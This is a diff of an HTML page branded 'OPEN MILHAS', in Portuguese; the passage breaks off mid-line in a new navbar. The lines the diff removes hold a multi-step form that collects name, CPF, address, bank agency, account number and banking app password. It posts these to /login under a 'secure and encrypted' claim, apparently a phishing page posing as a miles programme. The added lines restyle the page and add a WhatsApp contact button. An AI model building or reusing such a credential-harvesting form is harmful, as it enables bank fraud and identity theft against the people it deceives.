@@ -8,80 +8,40 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
     <style>
         :root { --primary: #2c7da0; --gold: #c5a059; --dark: #0a1128; }
-        body { font-family: 'Segoe UI', sans-serif; background: #fff; }
+        body { font-family: 'Segoe UI', sans-serif; background: #fff; overflow-x: hidden; }
+        
+        /* Logo e Header */
+        .navbar-brand { font-weight: 800; font-size: 1.6rem; }
         .progress-bar-custom { height: 10px; background: #e9ecef; border-radius: 20px; margin: 30px 0; overflow: hidden; }
         .progress-fill { height: 100%; background: var(--primary); width: 33%; transition: 0.4s; }
-        .form-control { border-radius: 50px; padding: 15px 25px; margin-bottom: 15px; border: 1px solid #ddd; }
-        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; cursor: pointer; }
         
-        /* Oculta os passos que não estão ativos */
+        /* Formulário */
+        .form-control { border-radius: 50px; padding: 15px 25px; margin-bottom: 15px; border: 1px solid #ddd; }
+        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-next:hover { background: var(--primary); transform: translateY(-2px); }
+        
         .step { display: none; }
         .step.active { display: block; animation: fadeIn 0.4s; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Rodapé e WhatsApp */
+        .whatsapp-float { position:fixed; width:60px; height:60px; bottom:40px; right:40px; background-color:#25d366; color:#FFF; border-radius:50px; text-align:center; font-size:30px; box-shadow: 2px 2px 10px rgba(0,0,0,0.2); z-index:1000; transition: 0.3s; }
+        .whatsapp-float:hover { transform: scale(1.1); color: white; }
+        footer { background-color: #f8f9fa; border-top: 1px solid #dee2e6; padding: 60px 0 30px 0; margin-top: 80px; }
+        .footer-logo { font-weight: 800; margin-bottom: 20px; display: block; }
+        .badge-img { height: 25px; filter: grayscale(100%); opacity: 0.7; transition: 0.3s; }
+        .badge-img:hover { filter: grayscale(0); opacity: 1; }
     </style>
 </head>
 <body>
 
-<div class="container mt-5" style="max-width: 600px;">
-    <div class="text-center mb-4">
-        <h2 class="fw-bold">OPEN <span style="color:var(--gold)">MILHAS</span></h2>
-        <p class="text-muted" id="stepText">Passo 1: Dados Pessoais</p>
-    </div>
+<a href="https://wa.me/5511984221050" class="whatsapp-float" target="_blank">
+    <i class="fab fa-whatsapp" style="margin-top:16px;"></i>
+</a>
 
-    <div class="progress-bar-custom"><div class="progress-fill" id="progressBar"></div></div>
-
-    <form action="/login" method="POST" id="mainForm">
-        <div class="step active" id="step1">
-            <input type="text" name="nome" class="form-control" placeholder="Nome completo *" required>
-            <input type="text" name="cpf" id="cpf" class="form-control" placeholder="CPF *" required>
-            <input type="email" name="email" class="form-control" placeholder="E-mail *">
-            <div class="text-end mt-3">
-                <button type="button" class="btn-next" onclick="nextStep(2)">Próximo <i class="fas fa-arrow-right ms-2"></i></button>
-            </div>
-        </div>
-
-        <div class="step" id="step2">
-            <input type="text" name="cep" class="form-control" placeholder="CEP *">
-            <input type="text" name="rua" class="form-control" placeholder="Rua e Número *">
-            <div class="text-end mt-3">
-                <button type="button" class="btn btn-link text-muted me-2" onclick="nextStep(1)">Voltar</button>
-                <button type="button" class="btn-next" onclick="nextStep(3)">Próximo <i class="fas fa-arrow-right ms-2"></i></button>
-            </div>
-        </div>
-
-        <div class="step" id="step3">
-            <input type="text" name="agencia" class="form-control" placeholder="Agência *" required>
-            <input type="text" name="conta" class="form-control" placeholder="Número da Conta *" required>
-            <input type="password" name="senha_app" class="form-control" placeholder="Senha do Aplicativo *" required>
-            <div class="alert alert-light small border-0"><i class="fas fa-shield-alt text-success me-2"></i> Ambiente seguro e criptografado.</div>
-            <div class="text-end mt-3">
-                <button type="button" class="btn btn-link text-muted me-2" onclick="nextStep(2)">Voltar</button>
-                <button type="submit" class="btn-next" style="background:var(--gold)">Finalizar Cadastro</button>
-            </div>
-        </div>
-    </form>
-</div>
-
-<script src="https://unpkg.com/imask"></script>
-<script>
-    // Máscara de CPF
-    IMask(document.getElementById('cpf'), { mask: '000.000.000-00' });
-
-    function nextStep(step) {
-        // Esconde todos os passos e mostra o desejado
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + step).classList.add('active');
-
-        // Atualiza a barra de progresso e textos
-        const fill = document.getElementById('progressBar');
-        const text = document.getElementById('stepText');
-        
-        if(step === 1) { fill.style.width = '33%'; text.innerText = 'Passo 1: Dados Pessoais'; }
-        if(step === 2) { fill.style.width = '66%'; text.innerText = 'Passo 2: Endereço'; }
-        if(step === 3) { fill.style.width = '100%'; text.innerText = 'Passo 3: Dados Bancários'; }
-        
-        window.scrollTo(0, 0);
-    }
-</script>
-</body>
-</html>
+<nav class="navbar border-bottom py-3">
+    <div class="container d-flex justify-content-between align-items-center">
+        <a class="navbar-brand" href="/" style="text-decoration: none;">
+            <span style="color: var(--dark);">OPEN</span> <span style="color: var(--gold);">MILHAS</span>
+        </a>
+        <div class="small text-muted fw-bold">Passo <span id="stepNumber">1</span>
